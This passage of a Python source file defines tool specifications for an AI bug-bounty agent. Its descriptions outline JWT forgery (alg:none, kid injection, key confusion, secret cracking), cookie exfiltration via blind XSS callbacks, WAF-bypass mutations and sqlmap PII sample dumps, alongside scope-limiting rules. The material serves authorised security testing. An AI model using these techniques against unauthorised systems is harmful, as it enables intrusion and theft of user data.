                "letter": {"type": "string", "description": "A single a-z letter to generate homoglyph variants for."}
            },
            "required": ["letter"]
        },
        executor=_execute_punycode_homoglyphs
    ),
    "generate_cors_poc": ToolSpec(
        name="generate_cors_poc",
        description="Writes a ready-to-open, credentialed-XHR CORS PoC HTML page pre-filled with a CONFIRMED-vulnerable URL (from a cors_checker finding) into this target's reports directory, for use as evidence attached to record_finding/export_report. Does not test anything itself.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The confirmed CORS-misconfigured URL to pre-fill into the PoC."}
            },
            "required": ["url"]
        },
        executor=_execute_generate_cors_poc
    ),
    "hackerone_search": ToolSpec(
        name="hackerone_search",
        description="Search HackerOne Hacktivity for disclosed reports to learn about past vulnerability classes on the target or industry.",
        parameters={
            "type": "object",
            "properties": {
                "keyword": {"type": "string", "description": "Search term (e.g. ssrf, bypass, subdomain takeover)."},
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."},
                "limit": {"type": "integer", "description": "Max results to return (default: 10).", "default": 10}
            }
        },
        executor=_execute_hackerone_search
    ),
    "hackerone_policy": ToolSpec(
        name="hackerone_policy",
        description="Retrieve public policy, safe harbor terms, and in-scope asset identifiers for a HackerOne program.",
        parameters={
            "type": "object",
            "properties": {
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."}
            },
            "required": ["program"]
        },
        executor=_execute_hackerone_policy
    ),
    "hackerone_stats": ToolSpec(
        name="hackerone_stats",
        description="Retrieve public program statistics (bounty ranges, response times, resolved report counts) for a HackerOne program.",
        parameters={
            "type": "object",
            "properties": {
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."}
            },
            "required": ["program"]
        },
        executor=_execute_hackerone_stats
    ),
    "dig": ToolSpec(
        name="dig",
        description="Perform non-destructive DNS queries for A, CNAME, TXT, MX, and NS records.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to resolve."},
                "type": {"type": "string", "description": "DNS record type: A, CNAME, TXT, MX, NS", "default": "A"}
            },
            "required": ["domain"]
        },
        executor=_execute_dig
    ),
    "curl": ToolSpec(
        name="curl",
        description=(
            "Fetch HTTP response headers and body preview for an endpoint with standard BugBounty identity "
            "headers. Supports GET, POST, PUT, DELETE with custom headers, cookies, JSON objects, and string "
            "payloads. Session handling is automatic -- you don't need to manage it yourself: any session "
            "cookie or auth token already captured for this target is auto-attached; a CSRF token seen on a "
            "GET (hidden _csrf/csrf_token input or a <meta name=\"csrf-token\"> tag) is auto-captured and then "
            "auto-injected (header + body field) into your next POST/PUT/PATCH/DELETE unless you pass your "
            "own; and if a stored session/token is sent but the response looks logged-out (401/403, a "
            "redirect to a login page, or 'please log in'/'session expired' text), the result includes a "
            "'session_status' field describing what happened. AUTO RE-LOGIN: once a successful POST login has "
            "been observed through this tool, that exact login (url/method/body) is remembered for the rest of "
            "the session — the NEXT time a dead session is detected, it's automatically replayed to get a fresh "
            "session, and the original request that found it dead is retried once (see 'retry_status_code'/"
            "'retry_body_preview' when that happens; 'session_auto_relogged_in' says whether it worked). Rate-"
            "limited to one attempt per 30s per target so a fuzzing loop can't hammer the login endpoint. If no "
            "login has been observed yet, or re-login fails (credentials may have changed), 'session_status' "
            "says so plainly — re-run the login flow yourself in that case."
        ),
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Full URL to request."},
                "method": {"type": "string", "description": "HTTP Method: GET, HEAD, POST, PUT, DELETE", "default": "GET"},
                "headers": {"type": "object", "description": "Optional custom HTTP headers dictionary (e.g. {'Content-Type': 'application/json', 'Cookie': 'session=...'})."},
                "cookies": {"type": "object", "description": "Optional cookies dictionary or string."},
                "json": {"type": "object", "description": "JSON payload object to send in the request body (automatically sets Content-Type: application/json)."},
                "data": {"type": "string", "description": "Raw string payload or URL-encoded form data to send in request body."}
            },
            "required": ["url"]
        },
        executor=_execute_curl
    ),
    "cookie_inspector": ToolSpec(
        name="cookie_inspector",
        description=(
            "Classify every cookie you're holding BEFORE calling jwt_forge on any of them. Free, "
            "local, no network call. Call this FIRST whenever a Set-Cookie/cookie shows up that you "
            "haven't already classified this session — before reflexively reaching for jwt_forge. "
            "Returns, per cookie, one of: 'jwt_candidate' (call jwt_forge on this), "
            "'dot_separated_non_jwt' (a signed-but-not-JWT session blob, e.g. Flask itsdangerous — "
            "jwt_forge can decode it for session content but won't be able to forge claims), or "
            "'opaque_session_id' (PHPSESSID/connect.sid/JSESSIONID/plain hex/UUID — jwt_forge is "
            "guaranteed to reject these, do not call it on them). Also returns a ready-to-use "
            "'jwt_candidates' / 'skip_jwt_forge_for' breakdown and a one-line recommendation. "
            "Leave the 'cookies' arg empty to classify whatever cookies have already been observed "
            "for this target (target.state['cookies']) instead of passing them explicitly."
        ),
        parameters={
            "type": "object",
            "properties": {
                "cookies": {
                    "description": "Optional. A dict of {cookie_name: value}, a raw 'name=value; name2=value2' Cookie header string, or a list of {\"name\":..,\"value\":..} objects. Omit to classify cookies already observed for this target.",
                },
            },
        },
        executor=_execute_cookie_inspector,
    ),
    "jwt_forge": ToolSpec(
        name="jwt_forge",
        description="Call cookie_inspector FIRST if you haven't already classified this cookie/value this session — it's free and tells you definitively whether this is worth forging, instead of guessing from the name alone. CHECK THE SHAPE BEFORE CALLING: this only ever does something useful on a value containing at least one '.' character (a 'segment.segment' or 'segment.segment.segment' structure) — real JWTs AND framework-signed session cookies (Flask/itsdangerous, and similar) share that shape, and you cannot tell which one you have until you decode it. A value with ZERO dots — a plain hex string, a UUID, an opaque API/bearer token, sess_*, connect.sid, PHPSESSID — is NOT this tool's target; calling it on one just burns a turn for a guaranteed 'not a valid JWT' error, so don't — cookie_inspector already told you this one was 'opaque_session_id' if that's what it is. Call this on every DOT-CONTAINING value you're holding, including cookies literally named 'session' — do NOT skip those just because the cookie name doesn't say 'jwt' or 'token'. Two outcomes: (1) it's a real JWT (has header+payload claims) — the tool attempts forgery/privilege-escalation techniques against it (alg:none, kid_injection, jwk_injection, hs256 confusion, and hs_crack). (2) it's NOT a real JWT (e.g. a Flask session) — the tool decodes it anyway and returns the raw decoded content in 'decoded_session_content' instead of forging claims; READ THAT CONTENT, since flags, secrets, or other sensitive data are frequently stored directly inside a session payload, especially in CTF-style labs — this is often faster than chasing an out-of-band callback. RECOMMENDED WORKFLOW for real JWTs: call with default algorithm='all' first — this runs only the free, no-secret-needed techniques (alg:none case/format variants, kid header path-traversal to /dev/null, embedded-JWK header self-signing, and RS256->HS256 public-key confusion if public_key_or_secret is given). Test those forged_tokens against the server. Only if all are rejected, escalate by calling again with algorithm='hs_crack' to brute-force the real HMAC secret against a built-in common-secret wordlist — this is deliberately NOT part of the default 'all' bundle, since it's the expensive fallback, not the first move. A hit produces a *legitimately* signed token, not just a bypass guess. The result's 'hs_crack_available' field tells you whether that escalation applies to this token. Automatically updates session state with the primary (best) forged token for subsequent tool calls.",
        parameters={
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "Original JWT string to base forgery on. If omitted, uses active session token from target state."
                },
                "claims": {
                    "type": "object",
                    "description": "Key-value dictionary of claims to modify or add (e.g. {'role': 'admin', 'isAdmin': true, 'admin': true}). Default: {'role': 'admin'}."
                },
                "algorithm": {
                    "type": "string",
                    "description": "Which technique(s) to run: 'all' (default — free techniques only: alg:none, kid_injection, jwk_injection, and hs256 confusion if a key is supplied), 'none' (unsigned alg bypass only), 'kid_injection' (kid path-traversal to /dev/null only), 'jwk_injection' (embedded self-signed RSA key only), 'hs256' (RS256->HS256 public-key confusion only — needs public_key_or_secret), or 'hs_crack' (brute-force the real HMAC secret — call this explicitly as a second step only after the free 'all' variants were tested and rejected by the server).",
                    "default": "all"
                },
                "public_key_or_secret": {
                    "type": "string",
                    "description": "RSA Public Key PEM string or HMAC secret key for HS256 confusion signing (optional). Tried across several byte-encodings automatically since exact PEM formatting varies between JWT libraries."
                },
                "wordlist": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Optional extra secrets to test during hs_crack, tried alongside the built-in common-secret list (e.g. app/domain-specific guesses)."
                }
            }
        },
        executor=_execute_jwt_forge
    ),
    "listener": ToolSpec(
        name="listener",
        description="Start or poll a local out-of-band (OOB) HTTP listener to confirm blind or stored vulnerabilities where there's no direct response leakage — stored/blind XSS exfiltrating document.cookie via fetch(), blind SSRF, blind SQLi/XXE, etc. Use action='start' first to get a callback URL, embed that URL (with a unique token) in your payload, deliver the payload, then use action='poll' with that same token to check whether the target called back and what data it sent.",
        parameters={
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "'start' (spin up the listener and return its callback URL — safe to call again, reuses the same listener), 'poll' (wait up to 'timeout' seconds for a callback containing 'token'), or 'stop' (shut the listener down).",
                    "default": "start"
                },
                "token": {
                    "type": "string",
                    "description": "Required for action='poll'. The unique string you embedded in the callback URL used in the payload, so the hit can be matched to this specific test."
                },
                "timeout": {
                    "type": "integer",
                    "description": "Seconds to wait for a callback during action='poll' (max 300). Default 45. Past hits are never discarded, so a short poll called later will still catch a callback that arrived after an earlier poll's window ended — you don't need one giant timeout to avoid missing a delayed hit. That said, reviewed/moderated submissions (see the xss skill) can take much longer than any single poll window — if several polls come back empty, don't conclude the vector failed; consider a longer wait or re-delivering the payload before ruling it out.",
                    "default": 45
                }
            }
        },
        executor=_execute_listener
    ),
    "browser_control": ToolSpec(
        name="browser_control",
        description=(
            "Drive a REAL, PERSISTENT headless browser (Chromium via Playwright) one action at a time, for "
            "the cases curl can't handle: a JS-driven login/redirect flow, a page that only renders its "
            "content client-side, an MFA/consent click-through, or reading values out of localStorage/"
            "sessionStorage. The page stays alive ACROSS separate calls to this tool within the session — "
            "goto a login page, fill the username/password fields, click submit, then goto an internal page, "
            "all as separate tool calls that build on each other, exactly like a human clicking through a "
            "browser. Cookies the browser picks up are automatically folded into the shared target session, "
            "so curl/other tools can reuse whatever the browser just authenticated. Use curl for plain HTTP "
            "recon — reach for this only when JS execution or real click/fill interaction is actually needed. "
            "MULTIPLE SESSIONS FOR CROSS-USER TESTING: pass `session` (e.g. 'victim', 'attacker') to get an "
            "independent browser context — own cookies, own storage, own page — for real two-identity BAC/IDOR "
            "testing (log in as user A in one session, user B in another, both still open and usable at the "
            "same time). Only the 'default' session's cookies are folded into the shared target session that "
            "curl/other tools reuse, specifically so a second named session never clobbers the primary one. "
            "'list_sessions' shows what's currently open for this target; 'close_all' tears all of them down "
            "at once ('close' alone only closes the one session it was called with)."
        ),
        parameters={
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "One of: 'goto' (navigate), 'click' (click an element), 'fill' (type into a field), 'eval_js' (run JavaScript in the page and return its result), 'get_storage' (read localStorage + sessionStorage), 'get_cookies' (read all cookies), 'get_network_log' (requests/responses seen so far), 'screenshot' (base64 PNG), 'close' (tear down the current `session` only), 'list_sessions' (show every open session for this target), or 'close_all' (tear down every open session for this target at once).",
                },
                "session": {"type": "string", "description": "Optional. Name of an independent browser context/session (e.g. 'victim', 'attacker') — defaults to 'default', the single ordinary session. Different names get fully isolated cookies/storage, for testing two logged-in identities at once."},
                "url": {"type": "string", "description": "Required for action='goto'. Full URL to navigate to."},
                "selector": {"type": "string", "description": "Required for 'click'/'fill'. A CSS selector, e.g. '#username', 'button[type=submit]'."},
                "value": {"type": "string", "description": "Required for 'fill'. The text to type into the selected field."},
                "script": {"type": "string", "description": "Required for 'eval_js'. JavaScript to evaluate in the page context, e.g. 'document.title' or '() => window.__APP_STATE__'."},
                "wait_for": {"type": "string", "description": "Optional, for 'goto'. One of 'load' (default), 'domcontentloaded', 'networkidle', or 'commit'."},
                "full_page": {"type": "boolean", "description": "Optional, for 'screenshot'. Capture the full scrollable page instead of just the viewport. Default false."},
                "timeout": {"type": "number", "description": "Seconds to wait for the action before giving up. Default 15.", "default": 15}
            },
            "required": ["action"]
        },
        executor=_execute_browser_control
    ),
    "spider": ToolSpec(
        name="spider",
        description="Crawl target web application to discover endpoints, URL parameters, form fields, and JavaScript assets. Supports authenticated crawling with session cookies or Authorization headers.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to crawl."},
                "depth": {"type": "integer", "description": "Crawl recursion depth (default: 2)", "default": 2},
                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Authorization': 'Bearer ...'})."},
                "cookies": {"type": "object", "description": "Optional session cookies string or dictionary to crawl authenticated pages."}
            },
            "required": ["url"]
        },
        executor=_execute_spider
    ),
    "katana": ToolSpec(
        name="katana",
        description=(
            "Fast, targeted crawl via ProjectDiscovery's katana — complements the built-in 'spider' tool (which "
            "does a slower, deeper pass with full credential/secret/parameter extraction wired into investigation "
            "memory). Use katana specifically when the researcher names it directly, or when they want a quicker, "
            "narrower crawl than spider's full pass. Discovered endpoints/JS routes feed the same shared endpoint "
            "state spider uses, so later tools see the combined result either way."
        ),
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to crawl."},
                "depth": {"type": "integer", "description": "Crawl recursion depth, 1-5 (default: 2).", "default": 2},
                "js_crawl": {"type": "boolean", "description": "Follow and parse JS files for additional endpoints (katana's -jc flag). Default true.", "default": True},
                "known_files": {"type": "string", "description": "Optional: also fetch well-known files, e.g. 'robotstxt,sitemapxml' (katana's -kf flag)."},
            },
            "required": ["url"]
        },
        executor=_execute_katana
    ),
    "wafbuster": ToolSpec(
        name="wafbuster",
        description="Detect WAF / CDN signatures and security headers on the target web application.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to inspect for WAF presence."}
            },
            "required": ["url"]
        },
        executor=_execute_wafbuster
    ),
    "surface_auditor": ToolSpec(
        name="surface_auditor",
        description="Discover exposed API routes, documentation endpoints (OpenAPI/Swagger), and sensitive files.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target web application URL to audit."}
            },
            "required": ["url"]
        },
        executor=_execute_surface_auditor
    ),
    "cors_checker": ToolSpec(
        name="cors_checker",
        description="Audit CORS policy for arbitrary origin reflection and credential exposure.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Endpoint URL to test for CORS misconfiguration."}
            },
            "required": ["url"]
        },
        executor=_execute_cors_checker
    ),
    "graphql_probe": ToolSpec(
        name="graphql_probe",
        description="Detect GraphQL endpoints and check for public introspection availability.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to probe for GraphQL schema."}
            },
            "required": ["url"]
        },
        executor=_execute_graphql_probe
    ),
    "sqlmap_scan": ToolSpec(
        name="sqlmap_scan",
        description=(
            "Confirm SQL injection on ONE specific url/parameter with sqlmap instead of hand-testing "
            "payloads one at a time. ONLY reach for this when there's an actual signal pointing at that "
            "specific endpoint — a DB error signature in a response (SQLSTATE, 'you have an error in your "
            "SQL syntax', a stack trace naming mysql/pg/mongo), a response that changed suspiciously on a "
            "quote/boolean tweak you already tried manually, or the researcher explicitly asking you to "
            "test a given endpoint/parameter for SQLi. Don't sweep every parameter on every endpoint through "
            "this 'just in case' — that's noisy and exactly what the researcher doesn't want. By default it "
            "only confirms injectability and lists database NAMES (list_databases=true) as impact proof. Set "
            "dump_sample_rows to go one step further and pull a SMALL sample (capped at 5 rows) of actual "
            "table data with --dump --limit — real PII in a few rows (emails, password hashes, names) is "
            "stronger, higher-paying proof than a database name alone for a mass-data-exposure finding. This "
            "is still a small proof-of-impact sample, not a full row-level extraction — don't raise the cap "
            "past what the tool allows, and don't reach for it on a plain confirmed-injectable finding where "
            "a database name is already enough evidence."
        ),
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The exact URL to test (query string params included if testing GET)."},
                "data": {"type": "string", "description": "POST body to test instead of/alongside the URL's query string, e.g. 'id=1&name=foo'."},
                "param": {"type": "string", "description": "Narrow testing to this one parameter name, when known — faster and quieter than testing every param."},
                "level": {"type": "integer", "description": "sqlmap test depth, 1-3 (default 1). Higher = more payload variants, more requests."},
                "risk": {"type": "integer", "description": "sqlmap risk level, 1-2 (default 1). Higher includes riskier payloads (e.g. time-based)."},
                "list_databases": {"type": "boolean", "description": "If injectable, enumerate database names as proof (default true)."},
                "current_db": {"type": "boolean", "description": "Also report the current database name."},
                "is_dba": {"type": "boolean", "description": "Also report whether the injected user has DBA privileges."},
                "dump_sample_rows": {"type": "integer", "description": "Opt-in: pull a small sample dump of real row data as mass-PII-leak proof (1-5 rows, hard-capped at 5). Pairs well with 'table'/'db' if you already know which table matters (e.g. a users table); otherwise sqlmap picks one itself."},
                "db": {"type": "string", "description": "Database name to target the sample dump at, when known (used only with dump_sample_rows)."},
                "table": {"type": "string", "description": "Table name to target the sample dump at, when known (used only with dump_sample_rows)."},
                "timeout": {"type": "integer", "description": "Wall-clock seconds before this call is killed (60-600). Default 240, or 360 when dump_sample_rows is set (dumping needs real extra time beyond a bare confirm). Raise this instead of re-calling after a timeout -- a timed-out run still salvages and reports whatever it confirmed before the kill."}
            },
            "required": ["url"]
        },
        executor=_execute_sqlmap_scan
    ),
    "wpscan_scan": ToolSpec(
        name="wpscan_scan",
        description=(
            "Run wpscan against a confirmed WordPress site to enumerate plugins/themes/users and check them "
            "against the vulnerability database. PREFER THIS over running wpscan through run_terminal_command — "
            "this tool automatically finds and uses a configured API token (if one was already given this "
            "session, or saved via /apikey) instead of trying an empty '--api-token' flag (which wpscan rejects "
            "outright) or silently running keyless with no record of why. If no token is configured anywhere, "
            "it still runs — just keyless, with a clear note on what that costs — and if the researcher's "
            "message doesn't already answer the question, you can ask them in plain text whether they have a "
            "free WPScan API token to pass in before running, instead of guessing. A free token is available "
            "at https://wpscan.com/api (sign up, then Profile -> API Token) — mention this if the researcher "
            "says they don't have one but want deeper results. Save it permanently with /apikey wpscan <token>."
        ),
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The WordPress site root, e.g. http://10.0.0.5/wordpress/."},
                "api_token": {"type": "string", "description": "WPScan vulnerability-database API token, if the researcher gave one. Remembered for the rest of this target's session once passed — no need to pass it again on a later call for the same target."},
                "enumerate": {"type": "string", "description": "wpscan --enumerate value (default 'vp,vt,u' — vulnerable plugins, vulnerable themes, users). Pass a broader value like 'vp,vt,tt,cb,dbe,u,m' only when you actually want the slower full sweep."}
            },
            "required": ["url"]
        },
        executor=_execute_wpscan_scan
    ),
    "waf_evasion_probe": ToolSpec(
        name="waf_evasion_probe",
        description=(
            "When a payload you already tried got blocked (403/firewall page/generic 'blocked' response — "
            "NOT the app's own validation error), try a bounded set of well-known WAF-bypass mutations "
            "(double URL-encoding, case alternation, inline SQL comments, alternate whitespace, HTML entity "
            "encoding, etc.) against the same endpoint and stop at the first one that gets through. Returns "
            "every mutation tried and which ones were blocked, so you can see exactly what worked. A mutation "
            "getting past the WAF does NOT by itself confirm the vulnerability still fires — re-verify impact "
            "with the winning mutated payload afterward (reflection check, sqlmap_scan, OOB listener, etc.)."
        ),
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The endpoint that blocked the original payload."},
                "payload": {"type": "string", "description": "The exact payload that got blocked, to mutate and retry."},
                "param": {"type": "string", "description": "Parameter name to inject the (mutated) payload into. Default 'test'."},
                "method": {"type": "string", "description": "HTTP method, GET or POST. Default GET."},
                "payload_type": {"type": "string", "description": "Optional hint: 'sqli', 'xss', or 'generic' — picks extra type-specific mutations (SQL keyword splitting, HTML entity encoding). Auto-detected from the payload if omitted."}
            },
            "required": ["url", "payload"]
        },
        executor=_execute_waf_evasion_probe
    ),
    "schema_fuzzer": ToolSpec(
        name="schema_fuzzer",
        description=(
            "Schema-driven BOLA and mass-assignment checks, seeded from the endpoint/param table 'spider' "
            "already built (target.state spider_intel) instead of guessing endpoints blind. Run 'spider' "
            "first. BOLA check: for endpoints with a numeric path/query ID, tries the adjacent ID (id+1) with "
            "YOUR current session and flags it if a DIFFERENT 200 response comes back. Each flagged result "
            "carries a 'confirmation_level': 'strong' means an identity-revealing field (email, username, "
            "name, phone, account id, etc.) actually differed between the baseline and mutated-ID response — "
            "real evidence the mutated ID returned a different identity's data, not incidental body noise; "
            "'weak' means only the raw body differed with no identity field to diff against (could still be a "
            "timestamp/nonce/CSRF token). Treat 'strong' results as much more worth recording, but EITHER way "
            "this is still NOT a confirmed finding — verify the returned object really belongs to someone else "
            "before recording. Mass-assignment check: for POST/PUT/PATCH endpoints, sends "
            "the known legitimate params plus a batch of extra privilege/financial fields the client was "
            "never supposed to set (role, isAdmin, balance, etc.) and flags it if the server echoes them back "
            "as accepted. Both checks are capped (max_checks) and report signals only, by design — they do "
            "not call record_finding themselves."
        ),
        parameters={
            "type": "object",
            "properties": {
                "checks": {"type": "string", "description": "Comma-separated subset to run: 'bola', 'mass_assignment', or both (default both)."},
                "max_checks": {"type": "integer", "description": "Cap on how many endpoints to test per check type (default 8, max 15) — keeps this bounded and low-noise."}
            }
        },
        executor=_execute_schema_fuzz
    ),
    "dns_bruteforce": ToolSpec(
        name="dns_bruteforce",
        description=(
            "Active DNS brute-force via shuffledns (massdns-backed with wildcard handling) — use this when passive "
            "subfinder returns few or no results, especially for internal, private, or non-publicly-indexed targets "
            "(e.g. CTF/lab domains) where certificate transparency logs won't have anything indexed."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Root domain to brute-force."}
            },
            "required": ["domain"]
        },
        executor=_execute_shuffledns
    ),
    "vhost_fuzz": ToolSpec(
        name="vhost_fuzz",
        description=(
            "Virtual-host fuzzing via ffuf — finds sites sharing an IP that don't "
            "have their own DNS entry, common on CTF infrastructure and internal "
            "environments where multiple challenges/apps share one host."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Base domain for the Host header."},
                "target_ip": {"type": "string", "description": "IP or URL to fuzz against."},
                "rate_limit": {"type": "integer", "description": "Max requests/sec (default: the configured fuzz_rate_limit, normally 150). Pass 0 to go uncapped -- only do this on a disposable CTF/lab box, never a live or production target."}
            },
            "required": ["domain", "target_ip"]
        },
        executor=_execute_ffuf_vhost
    ),
    "port_scan": ToolSpec(
        name="port_scan",
        description="Active TCP/UDP port scanner via naabu to discover open ports and non-standard web service ports.",
        parameters={
            "type": "object",
            "properties": {
                "hosts": {"type": "string", "description": "Target host, IP, domain, or comma-separated list of hosts to scan ports for."},
                "ports": {"type": "string", "description": "Ports to scan (e.g. 'top-100', 'top-1000', 'full', '80,443,8000-9000')", "default": "top-100"}
            },
            "required": ["hosts"]
        },
        executor=_execute_port_scan
    ),
    "permute_subdomains": ToolSpec(
        name="permute_subdomains",
        description="Generate subdomain mutations and permutations via alterx based on known subdomains or patterns.",
        parameters={
            "type": "object",
            "properties": {
                "subdomains": {"type": "array", "items": {"type": "string"}, "description": "List of discovered subdomains to generate permutations from."},
                "limit": {"type": "integer", "description": "Maximum number of candidate permutations to generate (default: 500)", "default": 500}
            },
            "required": ["subdomains"]
        },
        executor=_execute_permute_subdomains
    ),
    "resolve_candidates": ToolSpec(
        name="resolve_candidates",
        description="Fast bulk DNS resolution and filtering via dnsx to identify live resolvable domains and IP mappings.",
        parameters={
            "type": "object",
            "properties": {
                "candidates": {"type": "array", "items": {"type": "string"}, "description": "List of candidate domain names or permutations to resolve."}
            },
            "required": ["candidates"]
        },
        executor=_execute_resolve_candidates
    ),
    "tls_cert_scan": ToolSpec(
        name="tls_cert_scan",
        description="Scan TLS/SSL certificates and extract Subject Alternative Names (SANs) and Common Names (CNs) via tlsx.",
        parameters={
            "type": "object",
            "properties": {
                "hosts": {"type": "string", "description": "Target host, domain, or comma-separated list of hosts to inspect TLS certificates for."},
                "port": {"type": "string", "description": "Port to connect for TLS handshake (default: 443)", "default": "443"}
            },
            "required": ["hosts"]
        },
        executor=_execute_tls_cert_scan
    ),
    "content_discovery": ToolSpec(
        name="content_discovery",
        description="Active path and directory discovery fuzzing via ffuf on live web endpoints to reveal hidden routes and assets.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to fuzz."},
                "rate_limit": {"type": "integer", "description": "Max requests/sec (default: the configured fuzz_rate_limit, normally 150). Pass 0 to go uncapped -- only do this on a disposable CTF/lab box, never a live or production target."}
            },
            "required": ["url"]
        },
        executor=_execute_ffuf_content
    ),
    "run_terminal_command": ToolSpec(
        name="run_terminal_command",
        description=(
            "Run an arbitrary terminal command or Kali tool (e.g., custom nmap, gobuster, "
            "custom ffuf pipes), or execute a script previously written with save_file "
            "(python3 <path>, chmod +x <path> && <path>), targeting a specific host. You MUST "
            "specify the target host parameter for scope validation. Prefer the dedicated tools "
            "(sqlmap_scan, wpscan_scan) over running sqlmap/wpscan here directly — they handle "
            "session cookies, API tokens, and output parsing correctly where a hand-built command "
            "line is easy to get subtly wrong (e.g. an empty --api-token flag wpscan rejects outright). "
            "AUTH IS INJECTED AUTOMATICALLY — don't hardcode it: whenever this target has a "
            "captured session (from a login flow, cookie_inspector, or an imported Burp/Caido "
            "history), the command's environment carries it as HELLHOUND_COOKIE (raw 'k=v' "
            "cookie string), HELLHOUND_COOKIES_JSON (all cookies as a JSON object), "
            "HELLHOUND_AUTH_TOKEN (bearer/auth token if one was captured), and "
            "HELLHOUND_HEADERS_JSON (captured headers, e.g. Authorization, as JSON). A script "
            "that needs the authenticated session should read these from os.environ at RUN "
            "time (e.g. requests.Session().headers.update({'Cookie': os.environ.get("
            "'HELLHOUND_COOKIE', '')})) instead of a literal cookie/token pasted into the "
            "script's source — the env vars always reflect the CURRENT session, so the script "
            "keeps working even after re-auth rotates the cookie/token, and nothing stale ends "
            "up permanently saved on disk. "
            "TIMEOUT: defaults to 180s, raise via the timeout parameter (up to 600s) for anything "
            "that legitimately needs longer — a sqlmap --dump, a large nmap sweep, a slow custom "
            "script. On a timeout the command is killed but whatever it had already printed is "
            "still returned (stdout/stderr + timed_out=true) rather than discarded, so check that "
            "partial output before deciding what to do next: if it shows real progress (e.g. sqlmap "
            "already confirmed the injection or listed databases/tables), re-running the exact same "
            "command from scratch wastes the work already done — raise the timeout and/or narrow the "
            "command instead of blindly retrying it at the same timeout, which just times out again."
        ),
        parameters={
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The exact shell command line string to execute."},
                "target": {"type": "string", "description": "The target domain, IP, or URL being tested (used for safety scope verification)."},
                "timeout": {"type": "integer", "description": "Seconds to allow before killing the command (default 180, clamped 60-600). Raise this for a command known to take longer (a sqlmap --dump, a large scan) instead of letting it time out and retrying."}
            },
            "required": ["command", "target"]
        },
        executor=_execute_terminal_command
    ),
    "manage_scope": ToolSpec(
        name="manage_scope",
        description=(
            "Add or remove a host/domain from the active target's engagement scope, or add a "
            "disallowed-action rule, when the RESEARCHER explicitly tells you to — e.g. 'add "
            "staging.foo.com to scope', 'that subdomain isn't in the program, remove it', 'no "
            "brute-force testing on this one', 'actually bank.foo.com should be out of scope'. "
            "Only act on an explicit researcher instruction to change scope — never widen scope "
            "on your own judgment just because a tool happened to discover a new subdomain. "
            "Use action='show' with no hosts to read back the current scope lists."
        ),
        parameters={
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "One of: in/include/add (mark in-scope), out/exclude (mark out-of-scope/excluded), disallow/prohibit (add a prohibited-action rule, e.g. 'no-brute-force'), remove/rm/drop (take the host out of whichever list it's currently in), show (just return the current lists).",
                    "enum": ["in", "include", "add", "out", "exclude", "disallow", "prohibit", "remove", "rm", "delete", "del", "drop", "show"],
                },
                "hosts": {
                    "type": "array", "items": {"type": "string"},
                    "description": "Host(s)/domain(s)/rule name(s) to add or remove. Not required when action='show'.",
                },
            },
            "required": ["action"],
        },
        executor=_execute_manage_scope,
    ),
    "manage_program": ToolSpec(
        name="manage_program",
        description=(
            "Use when the RESEARCHER describes a whole bug-bounty PROGRAM/engagement that has "
            "several in-scope domains under one umbrella — e.g. 'we're starting the AGOV "
            "program, in-scope domains are a.gov.sg, b.gov.sg, c.gov.sg', or 'add d.gov.sg to "
            "the AGOV program', or 'what domains are in the AGOV program'. This is DIFFERENT "
            "from manage_scope: manage_scope edits one already-selected target's own scope "
            "lists, while manage_program groups MULTIPLE separate targets (one per in-scope "
            "domain, each keeping its own findings/session) under a shared program name and a "
            "shared scope definition. Do NOT rename the current target to the program's name "
            "and dump every domain into its scope_rules — create a real target per domain "
            "instead and attach each to the program. Actions: 'create' (start a new program, "
            "optionally with an initial 'domains' list — also attaches the CURRENTLY ACTIVE "
            "target to it), 'add_domain' (attach one or more additional in-scope domains/"
            "targets to an existing program via 'domains'), 'set_scope' (define/replace the "
            "program's overall scope — pass 'domains' or raw 'scope_text' — propagates to "
            "every target already attached), 'show' or 'list' (list the program's targets and "
            "scope). After creating/adding domains, switch to a specific one with the "
            "set_target tool using that domain's name to actually work on it."
        ),
        parameters={
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "description": "One of: create, add_domain, set_scope, show, list.",
                    "enum": ["create", "add_domain", "set_scope", "show", "list"],
                },
                "program_name": {
                    "type": "string",
                    "description": "The bug-bounty program/engagement name, e.g. 'AGOV'. Required for every action except when the current target is already attached to a program and you're using action='show'.",
                },
                "domains": {
                    "type": "array", "items": {"type": "string"},
                    "description": "In-scope domain(s) to create/attach under this program (create, add_domain), or to use as the scope list (set_scope).",
                },
                "scope_text": {
                    "type": "string",
                    "description": "Raw multi-line scope/program rules text (alternative to 'domains' for action='set_scope') — anything the program's scope page would contain.",
                },
            },
            "required": ["action"],
        },
        executor=_execute_manage_program,
    ),
    "save_file": ToolSpec(
        name="save_file",
        description=(
            "Save text content to a file in this target's own workspace (e.g. a list of "
            "resolved subdomains, a wordlist you assembled, notes to reference later in the "
            "session). The file is written under the target's own storage and can be read back "
            "later with read_artifact. For anything needing real shell processing (piping the "
